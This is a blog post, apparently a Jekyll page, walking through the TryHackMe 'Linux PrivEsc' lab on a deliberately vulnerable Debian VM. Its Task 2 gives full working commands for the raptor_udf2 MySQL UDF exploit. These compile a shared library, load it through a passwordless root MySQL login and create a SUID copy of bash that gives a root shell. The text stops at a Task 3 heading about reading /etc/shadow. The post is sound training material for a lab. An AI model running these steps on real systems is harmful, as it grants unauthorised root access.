---
layout: post
title: TryHackMe - Linux PrivEsc
---

## [Task 1] Deploy the Vulnerable Debian VM
### 1. Deploy the machine and login to the "user" account using SSH.
### 2. Run the "id" command. What is the result?
```
user@debian:~$ id
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
```
## [Task 2] Service Exploits

The MySQL service is running as root and the "root" user for the service does not have a password assigned. We can use a popular exploit that takes advantage of User Defined Functions (UDFs) to run system commands as root via the MySQL service.

Change into the /home/user/tools/mysql-udf directory:
```
cd /home/user/tools/mysql-udf
```
Compile the raptor_udf2.c exploit code using the following commands:
```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```
Connect to the MySQL service as the root user with a blank password:
```
mysql -u root
```
Execute the following commands on the MySQL shell to create a User Defined Function (UDF) "do_system" using our compiled exploit:
```
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```
Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission:
```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```
Exit out of the MySQL shell (type exit or \q and press Enter) and run the /tmp/rootbash executable with -p to gain a shell running with root privileges:
```
/tmp/rootbash -p
```
Remember to remove the /tmp/rootbash executable and exit out of the root shell before continuing as you will create this file again later in the room!
```
rm /tmp/rootbash
exit
```

## [Task 3] Weak File Permissions - Readable /etc/shadow

